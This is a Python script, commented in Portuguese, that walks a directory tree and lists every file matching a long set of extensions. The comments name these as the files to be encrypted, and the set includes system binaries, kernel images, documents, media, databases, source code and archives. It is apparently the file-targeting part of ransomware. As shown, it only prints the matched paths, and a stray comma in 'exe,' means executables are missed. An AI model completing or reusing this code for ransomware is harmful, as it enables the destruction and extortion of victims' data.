#!/usr/bin/python3

import os

#Função para varredura de arquivos
def discover(inital_path): #inital_path é o endereço onde começarão as buscas de arquivos

    #Extensões que serão encriptadas:
    extensions = [

        'exe,','dll','so','rpm','ded','vmlinuz','img', #arquivos do sistema

        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',  # imagem

        'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',  # audio

        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',  # video

        'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',  # microsoft office

        'odt', 'odp', 'ods', 'txt', 'pdf', 'epub', 'md', 'yml', 'yaml', 'json', 'xml', 'csv', # dados de estruturas e configs

        'db', 'sql', 'dbf', 'mdb', 'iso',  # banco de dados

        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',  # web

        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',  # codigo fonte c e c++

        'java', 'class', 'jar',  # java

        'ps', 'bat', 'vb',  # windows

        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',  # unix

        'go', 'py', 'pyc', 'bf', 'coffee',  # outros codigos fontes

        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compactos

    ]

    #Loop que percorre o sistema buscando os arquivos
    for dirpath, dirs, files in os.walk(inital_path):
        for _file in files:
            absolutepath = os.path.abspath(os.path.join(dirpath, _file)) #Dá o valor absoluto do arquivo
            ext = absolutepath.split('.')[-1] #Armazena a extensão do arquivo, dividindo a string e pegando o último item
            if ext in extensions: #Verifica se a extensão está na lista de encriptografados
                yield absolutepath


if __name__ == '__main__':
    x = discover(os.getcwd())
    for i in x:
        print(i)